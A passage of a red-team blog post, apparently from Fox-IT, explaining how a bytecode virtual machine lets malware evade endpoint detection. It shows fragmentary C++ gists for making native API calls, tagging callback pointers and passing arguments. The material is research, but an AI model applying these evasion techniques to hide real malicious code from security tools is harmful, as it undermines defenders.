          <td id="file-apicall-cpp-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-apicall-cpp-LC6" class="blob-code blob-code-inner js-file-line">		return ((f)target)(nargs, args…);             // Invoke the API and return its result</td>
        </tr>
        <tr>
          <td id="file-apicall-cpp-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-apicall-cpp-LC7" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="file-apicall-cpp-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-apicall-cpp-LC8" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
        <tr>
          <td id="file-apicall-cpp-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-apicall-cpp-LC9" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-apicall-cpp-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-apicall-cpp-LC10" class="blob-code blob-code-inner js-file-line">int main() {</td>
        </tr>
        <tr>
          <td id="file-apicall-cpp-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-apicall-cpp-LC11" class="blob-code blob-code-inner js-file-line">	FARPROC _Sleep = get_address_of_sleep();</td>
        </tr>
        <tr>
          <td id="file-apicall-cpp-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-apicall-cpp-LC12" class="blob-code blob-code-inner js-file-line">	apicall&lt;decltype(Sleep)&gt;::call(_Sleep, 10'000);</td>
        </tr>
        <tr>
          <td id="file-apicall-cpp-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-apicall-cpp-LC13" class="blob-code blob-code-inner js-file-line">	return 0;</td>
        </tr>
        <tr>
          <td id="file-apicall-cpp-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-apicall-cpp-LC14" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/8a00738abb4648ae2784dc239e6e2260/raw/50beaddbf1ef6331197f3f67220f67de774759f2/apicall.cpp" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/8a00738abb4648ae2784dc239e6e2260#file-apicall-cpp" class="Link--inTextBlock">
          apicall.cpp
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<p class="wp-block-paragraph">As specified in Microsoft’s x64 <code>__stdcall</code><sup data-fn="c9c503f8-ef6a-4456-a99d-d3dbe23b07ca" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c9c503f8-ef6a-4456-a99d-d3dbe23b07ca" id="c9c503f8-ef6a-4456-a99d-d3dbe23b07ca-link">15</a></sup> calling convention, the first four integer or pointer arguments are passed using the registers <code>rcx</code>, <code>rdx</code>, <code>r8</code> and <code>r9</code>, with the remaining arguments being passed on the stack. This means that at the time of executing the <code>call</code> instruction, <code>rcx</code> holds the number of arguments that must be passed to the API. The virtual machine can extract and inspect this value, and use it to correctly perform the call:</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132182066" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-vm-cpp" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="vm.cpp content, created by fox-srt on 07:33AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="vm.cpp">
        <tbody><tr>
          <td id="file-vm-cpp-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-vm-cpp-LC1" class="blob-code blob-code-inner js-file-line">auto target = fetch_value(vm, i-&gt;lparam_type, i-&gt;lparam);</td>
        </tr>
        <tr>
          <td id="file-vm-cpp-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-vm-cpp-LC2" class="blob-code blob-code-inner js-file-line">auto nargs = vm-&gt;registers.rcx.qword;</td>
        </tr>
        <tr>
          <td id="file-vm-cpp-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-vm-cpp-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-vm-cpp-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-vm-cpp-LC4" class="blob-code blob-code-inner js-file-line">// extract the arguments</td>
        </tr>
        <tr>
          <td id="file-vm-cpp-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-vm-cpp-LC5" class="blob-code blob-code-inner js-file-line">…</td>
        </tr>
        <tr>
          <td id="file-vm-cpp-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-vm-cpp-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-vm-cpp-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-vm-cpp-LC7" class="blob-code blob-code-inner js-file-line">// Invoke the api</td>
        </tr>
        <tr>
          <td id="file-vm-cpp-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-vm-cpp-LC8" class="blob-code blob-code-inner js-file-line">auto result = syscall(target, …);</td>
        </tr>
        <tr>
          <td id="file-vm-cpp-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-vm-cpp-LC9" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-vm-cpp-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-vm-cpp-LC10" class="blob-code blob-code-inner js-file-line">// return the result to the bytecode environment</td>
        </tr>
        <tr>
          <td id="file-vm-cpp-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-vm-cpp-LC11" class="blob-code blob-code-inner js-file-line">vm-&gt;registers.rax = result;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/c4f90ba74289af3ec894357a062e0e84/raw/1733669957835c3f2f0a55e1e436662d716ec98d/vm.cpp" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/c4f90ba74289af3ec894357a062e0e84#file-vm-cpp" class="Link--inTextBlock">
          vm.cpp
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<p class="wp-block-paragraph">The real values of the arguments are stored in <code>rdx</code>, <code>r8</code>, <code>r9</code> and on the stack. When extracting the arguments from the stack, one must remember to keep the shadow space<sup data-fn="beb24e60-5081-4d4d-9893-171865561078" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#beb24e60-5081-4d4d-9893-171865561078" id="beb24e60-5081-4d4d-9893-171865561078-link">16</a></sup> in mind.</p>



<p class="wp-block-paragraph">Visually, the process looks like this:</p>


<div class="wp-block-image">
<figure class="aligncenter size-large is-resized"><a href="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/apicall.png?ssl=1"><img data-recalc-dims="1" decoding="async" width="800" height="605" data-attachment-id="4881" data-permalink="https://blog.fox-it.com/apicall/" data-orig-file="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/apicall.png?fit=1082%2C818&amp;ssl=1" data-orig-size="1082,818" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="apicall" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/apicall.png?fit=300%2C227&amp;ssl=1" data-large-file="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/apicall.png?fit=800%2C605&amp;ssl=1" src="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/apicall.png?resize=800%2C605&amp;ssl=1" alt="" class="wp-image-4881" style="width:446px;height:auto"></a><figcaption class="wp-element-caption"><em>A virtualized <code>call</code> instruction invokes <code>ntdll!NtAllocateVirtualMemory</code>. This call is translated to a native <code>call</code> and the API is invoked. The resulting value is returned to the VM.</em></figcaption></figure>
</div>


<h2 class="wp-block-heading has-medium-font-size"><strong>Supporting Bytecode Function Callbacks</strong></h2>



<p class="wp-block-paragraph">Keeping in mind the porting of existing programs to the bytecode architecture, one cannot omit the support for function callbacks within code. Take for example a simple linked list implementation, with a <code>list_search</code> function taking a predicate callback:</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132182071" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-list_search-cpp" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="list_search.cpp content, created by fox-srt on 07:34AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="list_search.cpp">
        <tbody><tr>
          <td id="file-list_search-cpp-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-list_search-cpp-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">struct</span> <span class="pl-en">Node</span> {</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-list_search-cpp-LC2" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> value;</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-list_search-cpp-LC3" class="blob-code blob-code-inner js-file-line">    node* next;</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-list_search-cpp-LC4" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-list_search-cpp-LC5" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-list_search-cpp-LC6" class="blob-code blob-code-inner js-file-line"><span class="pl-k">struct</span> <span class="pl-en">SearchContext</span> {</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-list_search-cpp-LC7" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> value;</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-list_search-cpp-LC8" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-list_search-cpp-LC9" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-list_search-cpp-LC10" class="blob-code blob-code-inner js-file-line">Node* <span class="pl-en">list_search</span>(Node* head, <span class="pl-k">bool</span>(*predicate)(Node* n, <span class="pl-k">const</span> <span class="pl-k">void</span>* ctx), <span class="pl-k">const</span> void* ctx);</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-list_search-cpp-LC11" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-list_search-cpp-LC12" class="blob-code blob-code-inner js-file-line"><span class="pl-k">bool</span> <span class="pl-en">searcher</span>(Node* n, <span class="pl-k">const</span> <span class="pl-k">void</span>* ctx) {</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-list_search-cpp-LC13" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> n-&gt;<span class="pl-smi">value</span> == ((SearchContext*)ctx)-&gt;<span class="pl-smi">value</span>;</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-list_search-cpp-LC14" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-list_search-cpp-LC15" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-list_search-cpp-LC16" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">main</span>() {</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-list_search-cpp-LC17" class="blob-code blob-code-inner js-file-line">    Node head;</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-list_search-cpp-LC18" class="blob-code blob-code-inner js-file-line">    </td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-list_search-cpp-LC19" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> initialize and populate list</span></td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L20" class="blob-num js-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-list_search-cpp-LC20" class="blob-code blob-code-inner js-file-line">    …</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L21" class="blob-num js-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-list_search-cpp-LC21" class="blob-code blob-code-inner js-file-line">    </td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L22" class="blob-num js-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-list_search-cpp-LC22" class="blob-code blob-code-inner js-file-line">    SearchContext ctx = { <span class="pl-c1">10</span> };</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L23" class="blob-num js-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-list_search-cpp-LC23" class="blob-code blob-code-inner js-file-line">    Node* found = <span class="pl-c1">list_search</span>(&amp;head, searcher, &amp;ctx);</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L24" class="blob-num js-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-list_search-cpp-LC24" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L25" class="blob-num js-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-list_search-cpp-LC25" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-list_search-cpp-L26" class="blob-num js-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-list_search-cpp-LC26" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/e18b2895a83eaf4361cbe22e333ed9bb/raw/ce4618d94c81984ecc2fb7375d5e5dd0836c62d5/list_search.cpp" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/e18b2895a83eaf4361cbe22e333ed9bb#file-list_search-cpp" class="Link--inTextBlock">
          list_search.cpp
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<p class="wp-block-paragraph">However, a problem arises: how does the virtual machine differentiate between a normal bytecode function call, a native API call, and a function callback? The difference between the first two is clear: the bytecode function call is a call to an address within the bytecode and is known at compile time, where the API call is a dynamic call, meaning a call to a function pointer stored in a register or memory location. Given that a callback within bytecode is a dynamic call, too, the virtual machine must be provided with information about the type of call being made.</p>



<p class="wp-block-paragraph">To load a function pointer as an argument, a <code>lea</code><sup data-fn="92454169-a059-4c6e-bbcb-b92f8bac754c" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#92454169-a059-4c6e-bbcb-b92f8bac754c" id="92454169-a059-4c6e-bbcb-b92f8bac754c-link">17</a></sup> instruction is generated with its right operand referencing a memory address. This referenced memory address uses the instruction pointer (<code>rip</code>) register as the <code>base</code> field of the memory operand. When transpiling, such cases can be identified. To store this information, a new type of operand can be added to the already existing three types -listed in <em>“The Anatomy of an Instruction”</em>– (e.g. <code>Function</code>). When the virtual machine executes the <code>lea</code> instruction, it can check for the type of operand. If this operand’s type is <code>Function</code>, a tag can be added to the high 32 bits of the value, for example <code>0xDEADBEEF</code>.</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132182087" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-tag_example-cpp" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="tag_example.cpp content, created by fox-srt on 07:34AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="tag_example.cpp">
        <tbody><tr>
          <td id="file-tag_example-cpp-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-tag_example-cpp-LC1" class="blob-code blob-code-inner js-file-line">value = (0xDEADBEEFull &lt;&lt; 32) | (value &amp; 0xffffffff);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/34cd71777469c1443e25c42be84f61df/raw/3621afbb6cf8c7b3c6862f671ca87ac2abe72e59/tag_example.cpp" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/34cd71777469c1443e25c42be84f61df#file-tag_example-cpp" class="Link--inTextBlock">
          tag_example.cpp
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<p class="wp-block-paragraph">Once the <code>call</code> instruction is invoked, the value of the operand can be interrogated. If this value contains the previously added tag, a callback is requested. To perform the call, the tag is stripped from the value and the instruction pointer can be set accordingly.</p>



<h2 class="wp-block-heading has-medium-font-size"><strong>Supporting User-Defined Arguments</strong></h2>



<p class="wp-block-paragraph">Depending on the type of program that is executing, user-defined arguments are required. Take for example a program that simply sleeps for a period of time. How long should this program sleep for? Hardcoding these values is not always an option. Early on in the development of the project, a simple data structure was defined which could be provided to the bytecode’s entry point:</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132182108" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-bytecode-cpp" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="bytecode.cpp content, created by fox-srt on 07:35AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="bytecode.cpp">
        <tbody><tr>
          <td id="file-bytecode-cpp-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-bytecode-cpp-LC1" class="blob-code blob-code-inner js-file-line">struct Data {</td>
        </tr>
        <tr>
          <td id="file-bytecode-cpp-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-bytecode-cpp-LC2" class="blob-code blob-code-inner js-file-line">    size_t      size;               // Size of data including the `Data` header</td>
        </tr>
        <tr>
          <td id="file-bytecode-cpp-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
